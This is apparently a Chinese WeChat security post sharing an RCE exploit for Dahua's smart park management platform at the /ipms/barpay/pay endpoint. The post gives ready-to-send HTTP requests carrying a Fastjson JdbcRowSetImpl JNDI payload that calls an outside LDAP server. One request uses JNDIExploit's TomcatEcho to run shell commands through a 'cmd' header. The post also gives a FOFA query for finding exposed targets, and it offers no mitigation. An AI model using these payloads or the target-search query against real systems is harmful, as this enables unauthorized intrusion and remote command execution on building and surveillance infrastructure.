#  大华智慧园区综合管理平台 /ipms/barpay/pay RCE漏洞   
小白菜安全  小白菜安全   2024-05-28 18:26  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia3Jbct7fQNR5lLfbubAZZE4QDFdCvwFnNNHa9HcX9kIzDDTx2xcSSdWjicDTfrWocsnFEmOJCvwe3A/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
**漏洞检测poc**  
  
****```
POST /ipms/barpay/pay HTTP/1.1
Host: 
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
Content-Type: application/json
Content-Length: 113

{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://xxx.xxxx.xxx/", "autoCommit": true}
```  
  
漏洞利用：利用JNDIExploit-1.4-SNAPSHOT.jar工具回显马执行RCE  
```
POST /ipms/barpay/pay HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
cmd: whoami
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 104

{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://xx.xx.xx.xx/Basic/TomcatEcho", "autoCommit": true}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia3Jbct7fQNR5lLfbubAZZE4C8BDhRlGibVvDmCibN7FK2wRKpn2iaJ5SHR6xkuR8zaYVQrSPwYU4YPog/640?wx_fmt=png&from=appmsg "")  
#   
# 搜索语法  
  
**fofa：app="dahua-智慧园区综合管理平台"**  
  
****  
